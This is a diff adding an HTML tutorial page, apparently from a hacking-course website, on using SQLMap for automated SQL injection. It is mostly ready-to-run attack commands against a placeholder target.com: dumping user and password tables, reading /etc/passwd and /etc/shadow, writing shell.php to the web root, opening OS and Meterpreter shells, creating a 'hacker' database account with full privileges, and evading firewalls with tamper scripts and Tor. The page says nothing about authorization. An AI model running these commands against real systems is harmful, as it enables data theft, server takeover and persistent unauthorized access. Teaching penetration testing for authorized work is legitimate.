@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap Database Testing - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h6 class="mb-0">SQLMap</h6>
+                    </div>
+                    <div class="card-body p-0">
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#installation" class="text-success text-decoration-none">Installation</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#basic-usage" class="text-success text-decoration-none">Basic Usage</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#advanced" class="text-success text-decoration-none">Advanced Techniques</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#exploitation" class="text-success text-decoration-none">Exploitation</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#evasion" class="text-success text-decoration-none">WAF Evasion</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-database"></i> SQLMap Automated SQL Injection</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction" class="mb-5">
+                            <h2 class="text-success">What is SQLMap?</h2>
+                            <p class="lead">SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.</p>
+                            
+                            <div class="alert alert-info">
+                                <i class="fas fa-info-circle"></i> <strong>Learning Objective:</strong> Master automated SQL injection testing, database enumeration, and exploitation using SQLMap's powerful features.
+                            </div>
+
+                            <h3 class="text-success mt-4">Key Features</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Detection:</strong> Automatic SQL injection detection</li>
+                                        <li><strong>Exploitation:</strong> Full database takeover</li>
+                                        <li><strong>Database Support:</strong> MySQL, PostgreSQL, Oracle, MSSQL</li>
+                                        <li><strong>Techniques:</strong> Boolean, time-based, error-based</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Enumeration:</strong> Database structure mapping</li>
+                                        <li><strong>Data Extraction:</strong> Table and column dumping</li>
+                                        <li><strong>File System:</strong> File read/write operations</li>
+                                        <li><strong>OS Commands:</strong> Operating system takeover</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Installation Section -->
+                        <section id="installation" class="mb-5">
+                            <h2 class="text-success">Installation & Setup</h2>
+                            
+                            <h3 class="text-success mt-4">Kali Linux</h3>
+                            <div class="terminal">
+# SQLMap is pre-installed in Kali Linux
+sqlmap --version
+
+# Update to latest version
+sudo apt update
+sudo apt install sqlmap
+
+# Manual installation from GitHub
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py --version
+                            </div>
+
+                            <h3 class="text-success mt-4">Other Linux Distributions</h3>
+                            <div class="terminal">
+# Ubuntu/Debian
+sudo apt install sqlmap
+
+# CentOS/RHEL
+sudo yum install sqlmap
+
+# From pip
+pip3 install sqlmap-python3
+                            </div>
+
+                            <h3 class="text-success mt-4">Windows</h3>
+                            <div class="terminal">
+# Download from GitHub
+https://github.com/sqlmapproject/sqlmap
+
+# Extract and run
+python sqlmap.py --version
+
+# Or use Windows Subsystem for Linux (WSL)
+                            </div>
+                        </section>
+
+                        <!-- Basic Usage Section -->
+                        <section id="basic-usage" class="mb-5">
+                            <h2 class="text-success">Basic SQLMap Usage</h2>
+                            
+                            <h3 class="text-success mt-4">Simple URL Testing</h3>
+                            <div class="terminal">
+# Basic vulnerability scan
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Test specific parameter
+sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
+
+# Test all parameters
+sqlmap -u "http://target.com/page.php?id=1&name=test" --all
+
+# Batch mode (non-interactive)
+sqlmap -u "http://target.com/page.php?id=1" --batch
+                            </div>
+
+                            <h3 class="text-success mt-4">POST Request Testing</h3>
+                            <div class="terminal">
+# Test POST data
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
+
+# From Burp Suite request file
+sqlmap -r request.txt
+
+# Custom headers
+sqlmap -u "http://target.com/api" --headers="Authorization: Bearer token123"
+
+# Cookie-based injection
+sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; user_id=1"
+                            </div>
+
+                            <h3 class="text-success mt-4">Database Enumeration</h3>
+                            <div class="terminal">
+# List databases
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Current database
+sqlmap -u "http://target.com/page.php?id=1" --current-db
+
+# Database users
+sqlmap -u "http://target.com/page.php?id=1" --users
+
+# Database privileges
+sqlmap -u "http://target.com/page.php?id=1" --privileges
+                            </div>
+                        </section>
+
+                        <!-- Advanced Section -->
+                        <section id="advanced" class="mb-5">
+                            <h2 class="text-success">Advanced Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Injection Techniques</h3>
+                            <div class="terminal">
+# Specify injection techniques
+# B: Boolean-based blind
+# E: Error-based
+# U: Union query-based
+# S: Stacked queries
+# T: Time-based blind
+# Q: Inline queries
+
+sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST
+
+# Time-based only (stealth)
+sqlmap -u "http://target.com/page.php?id=1" --technique=T
+
+# Union-based (fastest)
+sqlmap -u "http://target.com/page.php?id=1" --technique=U
+                            </div>
+
+                            <h3 class="text-success mt-4">Database-Specific Options</h3>
+                            <div class="terminal">
+# Specify DBMS
+sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
+
+# Database version
+sqlmap -u "http://target.com/page.php?id=1" --banner
+
+# Database hostname
+sqlmap -u "http://target.com/page.php?id=1" --hostname
+
+# Check if user is DBA
+sqlmap -u "http://target.com/page.php?id=1" --is-dba
+                            </div>
+
+                            <h3 class="text-success mt-4">Data Extraction</h3>
+                            <div class="terminal">
+# List tables in database
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+
+# List columns in table
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
+
+# Dump table data
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
+
+# Dump specific columns
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
+
+# Dump all databases
+sqlmap -u "http://target.com/page.php?id=1" --dump-all
+                            </div>
+                        </section>
+
+                        <!-- Exploitation Section -->
+                        <section id="exploitation" class="mb-5">
+                            <h2 class="text-success">Advanced Exploitation</h2>
+                            
+                            <h3 class="text-success mt-4">File System Access</h3>
+                            <div class="terminal">
+# Read files from server
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
+
+# Write files to server
+sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Common files to read
+--file-read="/etc/passwd"           # Linux users
+--file-read="/etc/shadow"           # Linux passwords
+--file-read="C:\Windows\System32\drivers\etc\hosts"  # Windows hosts
+--file-read="/var/log/apache2/access.log"  # Web server logs
+                            </div>
+
+                            <h3 class="text-success mt-4">Operating System Commands</h3>
+                            <div class="terminal">
+# Execute OS commands
+sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
+
+# Interactive OS shell
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# Meterpreter shell
+sqlmap -u "http://target.com/page.php?id=1" --os-pwn
+
+# Registry access (Windows)
+sqlmap -u "http://target.com/page.php?id=1" --reg-read
+                            </div>
+
+                            <h3 class="text-success mt-4">Database Takeover</h3>
+                            <div class="terminal">
+# SQL shell
+sqlmap -u "http://target.com/page.php?id=1" --sql-shell
+
+# Create database user
+sqlmap -u "http://target.com/page.php?id=1" --sql-query="CREATE USER 'hacker'@'%' IDENTIFIED BY 'password123'"
+
+# Grant privileges
+sqlmap -u "http://target.com/page.php?id=1" --sql-query="GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'"
+
+# Upload and execute UDF (User Defined Functions)
+sqlmap -u "http://target.com/page.php?id=1" --udf-inject
+                            </div>
+                        </section>
+
+                        <!-- Evasion Section -->
+                        <section id="evasion" class="mb-5">
+                            <h2 class="text-success">WAF Evasion Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Basic Evasion</h3>
+                            <div class="terminal">
+# Random User-Agent
+sqlmap -u "http://target.com/page.php?id=1" --random-agent
+
+# Custom User-Agent
+sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (compatible; Googlebot/2.1)"
+
+# Delay between requests
+sqlmap -u "http://target.com/page.php?id=1" --delay=2
+
+# Randomize delay
+sqlmap -u "http://target.com/page.php?id=1" --delay=1-3
+                            </div>
+
+                            <h3 class="text-success mt-4">Advanced Evasion</h3>
+                            <div class="terminal">
+# Tamper scripts for WAF bypass
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
+
+# Multiple tamper scripts
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode
+
+# Common tamper scripts:
+--tamper=apostrophemask         # Replace apostrophe with UTF-8
+--tamper=base64encode           # Base64 encode payload
+--tamper=charencode             # URL encode characters
+--tamper=space2comment          # Replace space with comments
+--tamper=versioncomment         # Add version comments
+                            </div>
+
+                            <h3 class="text-success mt-4">Proxy and Tor</h3>
+                            <div class="terminal">
+# Use proxy
+sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
+
+# Use Tor
+sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5
+
+# Check Tor connection
+sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
+
+# Multiple proxies
+sqlmap -u "http://target.com/page.php?id=1" --proxy="http://proxy1:8080,http://proxy2:8080"
+                            </div>
+
+                            <h3 class="text-success mt-4">Output and Logging</h3>
+                            <div class="terminal">
+# Verbose output
+sqlmap -u "http://target.com/page.php?id=1" -v 3
+
+# Save session
+sqlmap -u "http://target.com/page.php?id=1" -s session.sqlite
+
+# Output to file
+sqlmap -u "http://target.com/page.php?id=1" --output-dir=/tmp/sqlmap
+
+# Traffic log
+sqlmap -u "http://target.com/page.php?id=1" -t traffic.log
+
+# Flush session
+sqlmap -u "http://target.com/page.php?id=1" --flush-session
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="d-flex justify-content-between mt-5">
+                            <a href="burpsuite.html" class="btn btn-outline-success">
+                                <i class="fas fa-arrow-left"></i> Previous: Burp Suite
+                            </a>
+                            <a href="nikto.html" class="btn btn-success">
+                                Next: Nikto <i class="fas fa-arrow-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
+                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
